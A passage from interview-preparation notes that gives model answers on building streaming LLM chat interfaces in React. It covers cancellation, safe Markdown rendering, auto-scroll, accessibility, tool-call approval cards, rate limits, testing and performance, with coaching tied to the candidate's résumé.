messages keep the same reference and `React.memo` skips them: only the live message re-renders. Inside the live
message I split Markdown into finished blocks, which are memoised, and the tail that is still changing. If profiling
still shows long tasks, I virtualise long conversations.

Mention how you would prove it: React DevTools Profiler (which components rendered and why) and the Performance panel
(long tasks, dropped frames), measured before and after.

### How do you implement a Stop button? {core}

Each send creates an AbortController, and Stop calls `abort()`. The pending `reader.read()` rejects, my `catch`
checks `signal.aborted` and marks the message as stopped rather than failed, and the partial text stays visible.
Aborting closes the HTTP connection. The server must notice the disconnect (FastAPI's `request.is_disconnected()` or
generator cancellation, `req.on('close')` in Node) and cancel the model call, or the platform keeps paying for tokens
nobody will read. Unmounting the chat aborts too.

### What happens if the user sends a new message while the previous answer is still streaming? {core}

Decide the product rule first: usually one live stream per conversation, so a new send cancels the old one. In code,
`send` aborts the previous controller before starting a new one, and the reducer marks any still-streaming message as
stopped when a new turn starts. Because the abort is asynchronous, a few late events from the old stream can still
arrive, so the reducer ignores events for a message that is no longer streaming. Without that guard you get the classic
bug of two answers interleaving their tokens.

### How do you render Markdown from an LLM safely? {core}

I treat model output as untrusted, because it can contain injected content from tools or web pages. I never use
`dangerouslySetInnerHTML` on it. I render Markdown to React elements with a library that ignores raw HTML by default, I
allow only `http`, `https` and `mailto` link schemes with `rel="noopener noreferrer"`, and I block or proxy external
images, because an image URL can carry exfiltrated data to an attacker's server the moment it renders. If HTML output
is truly needed, it goes through an allow-list sanitiser such as DOMPurify, and a Content Security Policy is the backstop.

### How do you handle a half-finished code block or table while it streams? {deep}

Mid-stream, Markdown is often syntactically incomplete: an opening code fence without its closing fence turns the rest
of the message into plain text until the fence closes, and then everything reflows. I split the text into finished
blocks (separated by blank lines outside code fences), which I parse once and memoise, and a tail that is still
changing. Before rendering the tail I close any open fence, so a half-streamed code block already looks like code. For
tables, I render the partial table as text until its header separator row has arrived. It costs a few lines of code and
removes most of the flicker.

### How should auto-scroll behave in a streaming chat?

Follow the new text only while the user is at, or near, the bottom. If they scroll up to reread something, stop
following and show a "Jump to latest" button; clicking it, or sending a new message, re-enables following. I measure
"near the bottom" with `scrollHeight - scrollTop - clientHeight` under a small threshold, scroll in `useLayoutEffect`
so there is no visible jump, and use instant rather than smooth scrolling while streaming, because smooth scrolling
fires intermediate scroll events that look like the user scrolling away.

### How do you make streaming text accessible to screen reader users? {core}

I keep the streaming text out of live regions, because a screen reader would try to announce every token. Instead the
streaming message has `aria-busy="true"` until it finishes, and one visually hidden `role="status"` region announces
short state changes: "Assistant is responding", "Response complete", "Stopped". Focus stays in the input after
sending and is never moved by incoming tokens. Stop is a real button, reachable by keyboard, and Escape in the input
also stops. Messages are `article` elements with labels, so users can navigate between them, and any typing animation
respects `prefers-reduced-motion`.

Some products also read the finished answer aloud through the live region. Make that a user setting, because long
answers become a wall of speech.

### How do you show tool calls and human approval steps inside the chat?

The stream carries typed events for them, and the assistant message stores a list of parts, not one string. A tool call
renders as a collapsible card: name, arguments as text (`JSON.stringify`, never HTML), and a status that goes from
running to done or failed when the result event arrives. An approval renders as a card with the proposed action and
Approve and Reject buttons. The decision is sent on a control channel (a POST to the run, or a WebSocket message) with
the approval id, so a double click is idempotent on the server, and the buttons are replaced by the recorded decision.

**Your angle:** at Quantiphi you built agentic workflows with HITL checkpoints and a review UI where people corrected
and approved AI output. Approval cards in a chat are the same idea in a conversational shape.

### The connection drops halfway through an answer. What does the user see, and what do you do? {core}

The user keeps the partial answer, marked "Interrupted", with a Retry button, never a blank message or a silent
truncation. I detect it two ways: the stream ends without a `done` event, or `reader.read()` rejects with a network
error. If the server runs the agent independently of the HTTP request and logs events with sequence numbers, the client
reconnects with the last id it saw and resumes without re-running the model. Otherwise Retry regenerates the turn. A
watchdog on silence (the server sends keep-alive comments every 15 seconds or so) catches connections that hang
without closing.

### How do you handle 429 rate limits in the chat UI?

I treat 429 as an expected state, not a generic error. I read the `Retry-After` header (seconds, or an HTTP date), show
"Too many requests, try again in N seconds" with a countdown, disable Send until it reaches zero, and keep the user's
message so they do not retype it. I do not auto-retry in a tight loop. A single automatic retry after the delay is
acceptable for background calls, but for chat the user should stay in control. The server side should rate-limit per
user or tenant, so one noisy user does not affect everyone.

### Where should chat state live: useState, useReducer, a global store or TanStack Query?

For one chat panel, `useReducer` in a hook: the transitions are many and related, and a pure reducer is easy to test.
Move it to an external store (Zustand, Redux, or a small store read with `useSyncExternalStore`) when other parts of
the app need it (a sidebar badge showing a run is streaming) or when the stream must survive the component unmounting,
for example while switching conversations. TanStack Query is right for **conversation history**, which is server
state, but not for the token stream itself. When a stream finishes I write the final message into the query cache with
`setQueryData` (or invalidate the query) so history stays consistent.

### How do you measure and improve time to first token from the front end? {deep}

I measure it with `performance.now()` from the click to the first rendered token, and send it to real-user monitoring
along with total duration and tokens per second, split by model and region. Front-end improvements: send the request
immediately without waiting for other fetches, refresh auth tokens ahead of expiry so a send never waits for a refresh,
`preconnect` to the API origin and reuse a warm HTTP/2 connection, and render the optimistic user message and a typing
indicator at once, so perceived latency drops even when real TTFT does not. Many TTFT problems are on the server or
infrastructure: a proxy buffering the response, or a cold start, will dominate. So I compare the client-side number with
server-side timing to know where to look.

### How do you test a streaming chat component?

In layers. The reducer and the parser are pure, so I unit-test them with awkward inputs: split chunks, a split emoji,
late events after Stop, a stream that ends without `done`. For the hook and view I use React Testing Library with the
network mocked: MSW can return a `ReadableStream` body, so I can stream events with small delays, assert with `findByText`
that text appears progressively, and click Stop. For E2E, Playwright can fulfil the chat route with a canned SSE body,
and I assert on user-visible behaviour (final text, Stop, error states) rather than timing, so the test is not flaky.

### How would you support several conversations, or switching conversations while one is streaming? {deep}

Key everything by conversation id. The reducer state becomes a map of conversation id to messages, and each stream
has its own controller in a map. Then make the product decision: either switching conversations aborts the live
stream (simple), or streams keep running in the background. For the background option, the stream must live outside the
component, in an external store or service module, so unmounting the view does not abort it, and the sidebar can show
which conversations are still generating. A cap on concurrent streams per user protects the backend.

### What does React StrictMode do to your streaming effects in development? {deep}

In development StrictMode mounts each component, runs its effects, simulates an unmount (running the cleanups), and
mounts again. If a stream is started from an effect (say, resuming a run on mount) and the cleanup does not abort it,
you get two streams and duplicated tokens. Only in development, which is exactly the point: it exposes the missing
cleanup before production does. My hook aborts in the cleanup, so the first stream is cancelled and only the second
survives. Sends triggered by a click are not affected, since event handlers do not run twice.

### How do you keep very long conversations fast? {deep}

Keep the render cost proportional to what is visible. Finished messages are memoised, so they cost nothing per token. For
hundreds of messages I virtualise the list (TanStack Virtual with measured, variable row heights), so only messages
near the viewport are in the DOM. I page older history from the server instead of loading everything, and I store
text as strings rather than arrays of tokens. The context window is the server's problem: the client should not send the
whole history with every request when the server already has it.

### The optimistic user message fails to send. What should happen?

The message stays in the list, marked "Not sent" with a Retry action, and the text is never lost. If the request failed
before any response, nothing reached the model, so retrying the same message is safe. If it failed mid-stream, retry
regenerates the assistant turn. To make retries safe on the server, the client sends a client-generated message id
(an idempotency key), so a retry after an ambiguous failure does not create a duplicate turn.

### Your resume does not show streaming work. How do you answer when they ask about it?

Be direct, then show depth. "I haven't shipped a token-streaming chat in production. The closest work is the
Human-in-the-Loop Document AI platform at Quantiphi: an agentic workflow with validation loops and approval
checkpoints, a FastAPI backend and a review UI on GCP. To close the gap I built a streaming agent chat end to end,
FastAPI SSE plus a WebSocket control channel and a React client with Stop, resume and approvals." Then walk through one
hard detail: chunk boundaries, late events, or cancellation reaching the model call.

Only say the last sentence after you have run the [streaming project](#/streaming-project) yourself and can explain
every file. Interviewers will ask you to go one level deeper.
